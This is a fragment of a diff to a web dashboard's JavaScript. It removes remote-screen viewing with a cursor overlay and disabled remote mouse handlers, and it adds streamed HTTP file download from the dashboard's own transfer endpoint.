-            click: clickHandler
-          };
-          
-          screensEl.innerHTML = "";
-          screensEl.appendChild(img);
-        }
-        
-        // Update image source and dimensions
-        img.src = currentScreen.url;
-        const actualWidth = currentScreen.actualWidth || 1920;
-        const actualHeight = currentScreen.actualHeight || 1080;
-        img.dataset.actualWidth = actualWidth;
-        img.dataset.actualHeight = actualHeight;
-        img.dataset.cursorX = currentScreen.cursorX !== undefined ? currentScreen.cursorX : -1;
-        img.dataset.cursorY = currentScreen.cursorY !== undefined ? currentScreen.cursorY : -1;
-        
-        // Remove old cursor overlay if exists
-        const oldCursor = screensEl.querySelector(".remote-cursor-overlay");
-        if (oldCursor) oldCursor.remove();
-        
-        // Create or update cursor overlay
-        let cursorOverlay = screensEl.querySelector(".remote-cursor-overlay");
-        if (!cursorOverlay) {
-          cursorOverlay = document.createElement("div");
-          cursorOverlay.className = "remote-cursor-overlay";
-          cursorOverlay.style.position = "absolute";
-          cursorOverlay.style.pointerEvents = "none";
-          cursorOverlay.style.zIndex = "1000";
-          cursorOverlay.style.display = "none";
-          screensEl.appendChild(cursorOverlay);
-        }
-        
-        // Ensure image loads before calculating dimensions and cursor position
-        img.onload = function() {
-          // Update dimensions if not set correctly
-          if (!img.dataset.actualWidth || img.dataset.actualWidth === "0" || img.dataset.actualWidth === "undefined") {
-            img.dataset.actualWidth = actualWidth || img.naturalWidth || 1920;
+      if (!pendingHttpDownload) return;
+      const { fileHandle } = pendingHttpDownload;
+      const fileName = name || pendingHttpDownload.fileName || "download.bin";
+      const fileSize = size || 0;
+      pendingHttpDownload = null;
+
+      showTransferProgress(transferId, "Downloading File", fileName, fileSize);
+      const modeEl = document.getElementById(`xfer-mode-${transferId}`);
+      if (modeEl) modeEl.textContent = fileHandle ? "Streaming to disk (zero memory)..." : "Binary HTTP download...";
+
+      try {
+        const pullUrl = `${SERVER_BASE}/api/transfer/${transferId}/pull`;
+        const response = await fetch(pullUrl);
+        if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        const contentLength = parseInt(response.headers.get("Content-Length") || response.headers.get("X-File-Size")) || fileSize;
+
+        if (fileHandle) {
+          // Streaming mode: write directly to disk via File System Access API (~0 memory)
+          const writable = await fileHandle.createWritable();
+          const reader = response.body.getReader();
+          let received = 0;
+          while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+            await writable.write(value);
+            received += value.length;
+            updateTransferProgress(transferId, received, contentLength);
           }
-          if (!img.dataset.actualHeight || img.dataset.actualHeight === "0" || img.dataset.actualHeight === "undefined") {
-            img.dataset.actualHeight = actualHeight || img.naturalHeight || 1080;
+          await writable.close();
+        } else {
+          // Fallback: read into Blob
+          const reader = response.body.getReader();
+          const parts = [];
+          let received = 0;
+          while (true) {
+            const { done, value } = await reader.read();
+            if (done) break;
+            parts.push(value);
+            received += value.length;
+            updateTransferProgress(transferId, received, contentLength);
           }
-          
-          // Update cursor position
-          updateCursorOverlay(img, cursorOverlay);
-        };
-        
-        // Also update cursor when image dimensions change
-        const updateCursor = () => {
-          updateCursorOverlay(img, cursorOverlay);
-        };
-        img.addEventListener("load", updateCursor);
-        
-        // Focus container initially, then image will take focus on load
-        if (container) {
-          container.focus();
+          const blob = new Blob(parts, { type: "application/octet-stream" });
+          parts.length = 0;
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement("a");
+          a.href = url; a.download = fileName;
+          document.body.appendChild(a); a.click(); document.body.removeChild(a);
+          setTimeout(() => URL.revokeObjectURL(url), 10000);
         }
-        
-        // Focus image after a short delay
-        setTimeout(() => {
-          if (img) img.focus();
-          updateCursorOverlay(img, cursorOverlay);
-        }, 100);
+        updateTransferProgress(transferId, contentLength, contentLength);
+      } catch (e) {
+        console.error("Download error:", e);
+        alert("Download failed: " + (e.message || e));
       }
-    }
-    
-    // Update cursor overlay position
-    function updateCursorOverlay(img, cursorOverlay) {
-      if (!img || !cursorOverlay) return;
-      
-      const rect = img.getBoundingClientRect();
-      const screensEl = document.getElementById("remoteAccessScreens");
-      const containerRect = screensEl ? screensEl.getBoundingClientRect() : null;
-      
-      const actualWidth = parseInt(img.dataset.actualWidth) || 1920;
-      const actualHeight = parseInt(img.dataset.actualHeight) || 1080;
-      const cursorX = parseInt(img.dataset.cursorX) || -1;
-      const cursorY = parseInt(img.dataset.cursorY) || -1;
-      
-      if (cursorX >= 0 && cursorY >= 0 && rect.width > 0 && rect.height > 0 && containerRect) {
-        // Calculate cursor position on scaled image
-        const scaleX = rect.width / actualWidth;
-        const scaleY = rect.height / actualHeight;
-        const x = (rect.left - containerRect.left) + (cursorX * scaleX);
-        const y = (rect.top - containerRect.top) + (cursorY * scaleY);
-        
-        // Show and position cursor overlay (relative to container)
-        cursorOverlay.style.display = "block";
-        cursorOverlay.style.left = `${x}px`;
-        cursorOverlay.style.top = `${y}px`;
-        cursorOverlay.style.width = "20px";
-        cursorOverlay.style.height = "20px";
-        cursorOverlay.style.marginLeft = "-10px";
-        cursorOverlay.style.marginTop = "-10px";
-        cursorOverlay.style.border = "2px solid white";
-        cursorOverlay.style.borderRadius = "50%";
-        cursorOverlay.style.boxShadow = "0 0 0 1px black, 0 0 4px rgba(0,0,0,0.5)";
-        cursorOverlay.style.background = "rgba(255, 255, 255, 0.3)";
-      } else {
-        cursorOverlay.style.display = "none";
-      }
-    }
-
-    // View-only mode: Mouse/keyboard handlers disabled
-    // These functions are kept for potential future use but are not called
-    function handleRemoteMouseMove(e) {
-      // View-only: no action
-      return;
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      
-      const now = Date.now();
-      if (now - lastMouseMoveTime < MOUSE_MOVE_THROTTLE) return;
-      lastMouseMoveTime = now;
-      
-      // Find the image element
-      let img = e.currentTarget || e.target;
-      if (!img || img.tagName !== "IMG") {
-        const screensEl = document.getElementById("remoteAccessScreens");
-        img = screensEl ? screensEl.querySelector("img") : null;
-        if (!img) return;
-      }
-      
-      const rect = img.getBoundingClientRect();
-      const actualWidth = parseInt(img.dataset.actualWidth) || 1920;
-      const actualHeight = parseInt(img.dataset.actualHeight) || 1080;
-      
-      // Calculate coordinates based on actual screen dimensions
-      // Account for image scaling and positioning
-      const scaleX = actualWidth / rect.width;
-      const scaleY = actualHeight / rect.height;
-      const x = Math.max(0, Math.min(actualWidth - 1, Math.round((e.clientX - rect.left) * scaleX)));
-      const y = Math.max(0, Math.min(actualHeight - 1, Math.round((e.clientY - rect.top) * scaleY)));
-      
-      // Ensure coordinates are within bounds
-      const clampedX = Math.max(0, Math.min(actualWidth - 1, x));
-      const clampedY = Math.max(0, Math.min(actualHeight - 1, y));
-      
-      const eventData = {
-        nodeId: activeRemoteNodeId,
-        screenIdx: remoteScreens[activeRemoteNodeId]?.currentScreen || 0,
-        type: "move",
-        x: clampedX,
-        y: clampedY
-      };
-      
-      socket.emit("remote_mouse_event", eventData);
-    }
-
-    // View-only mode: Mouse/keyboard handlers disabled
-    function handleRemoteMouseDown(e) {
-      // View-only: no action
-      return;
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      
-      // Find the image element
-      let img = e.currentTarget || e.target;
-      if (!img || img.tagName !== "IMG") {
-        const screensEl = document.getElementById("remoteAccessScreens");
-        img = screensEl ? screensEl.querySelector("img") : null;
-        if (!img) return;
-      }
-      
-      // Focus image for keyboard events
-      img.focus();
-      
-      const rect = img.getBoundingClientRect();
-      const actualWidth = parseInt(img.dataset.actualWidth) || 1920;
-      const actualHeight = parseInt(img.dataset.actualHeight) || 1080;
-      
-      // Calculate coordinates
-      const scaleX = actualWidth / rect.width;
-      const scaleY = actualHeight / rect.height;
-      const x = Math.max(0, Math.min(actualWidth - 1, Math.round((e.clientX - rect.left) * scaleX)));
-      const y = Math.max(0, Math.min(actualHeight - 1, Math.round((e.clientY - rect.top) * scaleY)));
-      const button = e.button === 0 ? "left" : e.button === 2 ? "right" : "middle";
-      
-      // Ensure coordinates are within bounds
-      const clampedX = Math.max(0, Math.min(actualWidth - 1, x));
-      const clampedY = Math.max(0, Math.min(actualHeight - 1, y));
-      
-      const currentScreenIdx = remoteScreens[activeRemoteNodeId]?.currentScreen || 0;
-      const eventData = {
-        nodeId: activeRemoteNodeId,
-        screenIdx: currentScreenIdx,
-        type: "down",
-        button,
-        x: clampedX,
-        y: clampedY
-      };
-      
-      console.log(`Mouse down on screen ${currentScreenIdx}:`, eventData);
-      socket.emit("remote_mouse_event", eventData);
-    }
-
-    // View-only mode: Mouse/keyboard handlers disabled
-    function handleRemoteMouseUp(e) {
-      // View-only: no action
-      return;
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      
-      // Find the image element
-      let img = e.currentTarget || e.target;
-      if (!img || img.tagName !== "IMG") {
-        const screensEl = document.getElementById("remoteAccessScreens");
-        img = screensEl ? screensEl.querySelector("img") : null;
-        if (!img) return;
-      }
-      
-      const rect = img.getBoundingClientRect();
-      const actualWidth = parseInt(img.dataset.actualWidth) || 1920;
-      const actualHeight = parseInt(img.dataset.actualHeight) || 1080;
-      
-      // Calculate coordinates
-      const scaleX = actualWidth / rect.width;
-      const scaleY = actualHeight / rect.height;
-      const x = Math.max(0, Math.min(actualWidth - 1, Math.round((e.clientX - rect.left) * scaleX)));
-      const y = Math.max(0, Math.min(actualHeight - 1, Math.round((e.clientY - rect.top) * scaleY)));
-      const button = e.button === 0 ? "left" : e.button === 2 ? "right" : "middle";
-      
-      // Ensure coordinates are within bounds
-      const clampedX = Math.max(0, Math.min(actualWidth - 1, x));
-      const clampedY = Math.max(0, Math.min(actualHeight - 1, y));
-      
-      const currentScreenIdx = remoteScreens[activeRemoteNodeId]?.currentScreen || 0;
-      const eventData = {
-        nodeId: activeRemoteNodeId,
-        screenIdx: currentScreenIdx,
-        type: "up",
-        button,
-        x: clampedX,
-        y: clampedY
-      };
-      
-      console.log(`Mouse up on screen ${currentScreenIdx}:`, eventData);
-      socket.emit("remote_mouse_event", eventData);
-    }
-
-    // View-only mode: Mouse/keyboard handlers disabled
-    function handleRemoteWheel(e) {
-      // View-only: no action
-      return;
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      
-      // Find the image element
-      let img = e.currentTarget || e.target;
-      if (!img || img.tagName !== "IMG") {
-        const screensEl = document.getElementById("remoteAccessScreens");
-        img = screensEl ? screensEl.querySelector("img") : null;
-        if (!img) return;
-      }
-      
-      const rect = img.getBoundingClientRect();
-      const actualWidth = parseInt(img.dataset.actualWidth) || 1920;
-      const actualHeight = parseInt(img.dataset.actualHeight) || 1080;
-      
-      // Calculate coordinates
-      const scaleX = actualWidth / rect.width;
-      const scaleY = actualHeight / rect.height;
-      const x = Math.max(0, Math.min(actualWidth - 1, Math.round((e.clientX - rect.left) * scaleX)));
-      const y = Math.max(0, Math.min(actualHeight - 1, Math.round((e.clientY - rect.top) * scaleY)));
-      
-      // Get scroll delta
-      // deltaY: positive = scroll down, negative = scroll up
-      // Windows expects positive = scroll up, negative = scroll down
-      // So we need to invert the sign
-      const deltaY = e.deltaY || 0;
-      const deltaX = e.deltaX || 0;
-      
-      // Normalize delta (typically 100 per "click" of scroll)
-      // Invert sign: browser positive deltaY = scroll down, but Windows positive = scroll up
-      const scrollDelta = -Math.round(deltaY / 100);
-      const scrollDeltaX = -Math.round(deltaX / 100);
-      
-      // Ensure coordinates are within bounds
-      const clampedX = Math.max(0, Math.min(actualWidth - 1, x));
-      const clampedY = Math.max(0, Math.min(actualHeight - 1, y));
-      
-      const currentScreenIdx = remoteScreens[activeRemoteNodeId]?.currentScreen || 0;
-      const eventData = {
-        nodeId: activeRemoteNodeId,
-        screenIdx: currentScreenIdx,
-        type: "wheel",
-        x: clampedX,
-        y: clampedY,
-        delta: scrollDelta,
-        deltaX: scrollDeltaX
-      };
-      
-      console.log(`Mouse wheel on screen ${currentScreenIdx}:`, eventData);
-      socket.emit("remote_mouse_event", eventData);
-    }
-
-    // View-only mode: Keyboard events disabled
-    // Only allow Escape to close modal
-    function handleRemoteKeyDown(e) {
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      
-      const modal = document.getElementById("remoteAccessModal");
-      if (!modal || modal.classList.contains("hidden")) return;
-      
-      // Only allow Escape to close modal in view-only mode
-      if (e.key === "Escape") {
-        closeRemoteAccess();
-        return;
-      }
-      
-      // View-only: no other keyboard actions
-    }
-    
-    // Attach only Escape handler
-    window.addEventListener("keydown", handleRemoteKeyDown, true);
-
-    // Socket handlers for remote access
-    socket.on("remote_access_screenshot", ({ client, screens }) => {
-      if (!client || !screens || screens.length === 0) return;
-      
-      if (!remoteScreens[client]) {
-        remoteScreens[client] = { screens: [], currentScreen: 0 };
-      }
-      
-      // Convert base64 to data URLs and store actual dimensions and cursor position
-      remoteScreens[client].screens = screens.map(s => ({
-        screenIdx: s.screenIdx || 0,
-        url: s.base64 ? `data:image/jpeg;base64,${s.base64}` : "",
-        actualWidth: s.actualWidth || 0,
-        actualHeight: s.actualHeight || 0,
-        cursorX: s.cursorX !== undefined ? s.cursorX : -1,
-        cursorY: s.cursorY !== undefined ? s.cursorY : -1
-      }));
-      
-      if (activeRemoteNodeId === client) {
-        renderRemoteScreens();
-      }
-    });
-
-    socket.on("remote_screenshot_update", ({ client, screenIdx, base64, actualWidth, actualHeight, cursorX, cursorY }) => {
-      if (!client || base64 === undefined) return;
-      
-      if (remoteScreens[client] && remoteScreens[client].screens[screenIdx]) {
-        remoteScreens[client].screens[screenIdx].url = `data:image/jpeg;base64,${base64}`;
-        if (actualWidth) remoteScreens[client].screens[screenIdx].actualWidth = actualWidth;
-        if (actualHeight) remoteScreens[client].screens[screenIdx].actualHeight = actualHeight;
-        if (cursorX !== undefined) remoteScreens[client].screens[screenIdx].cursorX = cursorX;
-        if (cursorY !== undefined) remoteScreens[client].screens[screenIdx].cursorY = cursorY;
-        
-        if (activeRemoteNodeId === client) {
-          renderRemoteScreens();
-          
-          // Update cursor overlay after render
-          setTimeout(() => {
-            const screensEl = document.getElementById("remoteAccessScreens");
-            const img = screensEl ? screensEl.querySelector("img") : null;
-            const cursorOverlay = screensEl ? screensEl.querySelector(".remote-cursor-overlay") : null;
-            if (img && cursorOverlay) {
-              img.dataset.cursorX = remoteScreens[client].screens[screenIdx].cursorX !== undefined ? remoteScreens[client].screens[screenIdx].cursorX : -1;
-              img.dataset.cursorY = remoteScreens[client].screens[screenIdx].cursorY !== undefined ? remoteScreens[client].screens[screenIdx].cursorY : -1;
-              updateCursorOverlay(img, cursorOverlay);
-            }
-          }, 50);
-        }
-      }
-    });
-
-    // Request screenshot update (for periodic updates)
-    socket.on("request_remote_screenshot_update", () => {
-      // This is handled server-side, no client action needed
+      removeTransferProgress(transferId);
     });
   </script>
 </body>
